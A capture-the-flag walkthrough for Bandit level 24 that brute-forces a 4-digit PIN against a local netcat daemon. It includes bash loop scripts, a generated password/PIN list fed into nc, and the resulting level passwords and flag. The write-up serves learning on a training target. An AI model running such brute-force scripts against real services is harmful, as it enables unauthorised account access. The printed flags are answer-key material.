# Bandit 24

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

Moved this into an independent file due to its scale compared to others.

I started by sshing into the level, providing the password I got from the previous level.

Based of the description, I knew I had to check port 30002. so I run `nc localhost 30002` and get back:
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
Well the password we already know, but a secret pincode... Nope. Inputting something random like 1234 returns:
```bash
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
Wrong! Please enter the correct pincode. Try again.
```

Okay, so the next step is understanding how to get that pin code. It is a 4-digit pincode, with 10000 combinations. So we have a range of 0000 to 9999. We could manually go through each one, wouldn't that be fun? But I am lazy, and would rather solve this quickly. Knowing a bit about bash scripting, I can utilise a for loop. I go into /tmp/ and create a new folder to work this problem out.
```bash
bandit24@bandit:~$ mkdir /tmp/solutions
bandit24@bandit:~$ cd /tmp/solutions
bandit24@bandit:/tmp/solutions$ touch script.sh
bandit24@bandit:/tmp/solutions$ ls
script.sh
```

Now, within `script.sh` I write:
```bash
#!/bin/bash

for i in {0000..9999}
do
	echo  $i
done
```

Adding executable permissions with `chmod +x ./script.sh` so I can run it and go.

As you'd expect, all 10000 numbers get printed to me. Amazing! Now I got to figure out how I can put these numbers, with the password, inside netcat. Through research, and common sense, we can pipe the number into netcat, thus having us provide the input and make the connection to port 30002 at once. I modify my code like so:
```bash
#!/bin/bash

pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}
do
	echo "$pass24 $i" | nc localhost 30002
done
```

My thinking here is that it will now loop over, 10000 times, creating new netcat connections until we finally have the correct match. The result?

```bash
bandit24@bandit:/tmp/solutions$ ./script.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Timeout. Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
```

Great, it's looping. However, it's looping through each number at around 15 seconds. Yep. Let's say our secret pincode is 6666. It would take the program 99990 seconds to finally get there (if the computer doesn't start slowing down due to all the netcat connections), which is around 28 hours. Yep, I am lazy. I don't have that long. As I finish writing this, the console just printed out the wrong command for the 12th time. Just 9988 more possible combinations to go.

There must be a better solution. Pen testers and hackers can't possibly take that long! This is a basic brute force attack! Obviously, there is. Reading online, I read about something called bash file redirection. Something that I've already kinda done. Whether I'm echoing "node_modules/" >> .gitignore or I'm adding a title to a README, I have done it already. However, this was something else.

Essentially what we can do is loop over every single one of those numbers, pair them with the password, and save all the combinations into a text document. Then, we use file redirection and feed the text document into the netcat. If successful, it should be much, MUCH, faster. So I gave it a go.

I modified the script that we had before:
```bash
#!/bin/bash

pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}
do
	echo $pass24 $i >> passlist.txt
done
```

This will loop over and append to the passlist file.

Then all I had to do was feed the file to the connection:
```bash
nc localhost 30002 < passlist.txt
```

Result?
```bash
# Hundreds of lines omitted
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

It roughly took 8 seconds. Wow! So easy, and simple. This really shows me that it's not difficult at all cracking a 4 digit passcode. And although the challenge has it pair the passcode with a password, if a hacker knows just a password, then that's all they need to potentially get into your system.

So we got the flag for bandit25. Had to do a lot of research on this, but really enjoyed this level. The only issue I have with this method is that it doesn't show you what the passcode was. Looking through other people's discussions, I roughly added to this by:

```bash
nc localhost 30002 < passlist.txt > list_of_wrongs.txt
```
After a few seconds, this creates a `list_of_wrongs.txt` file with all the "Wrong!" messages. I open it up in vim, set line count with `:set number`, go all the way down, ditch a few of the last numbers, and was able to get it.

```bash
bandit24@bandit:/tmp/solution2$ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2263" | netcat localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

Not a good solution, but definitely a solution for the end of the day. Looking forward to the next challenge.


#### Flag:
**uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**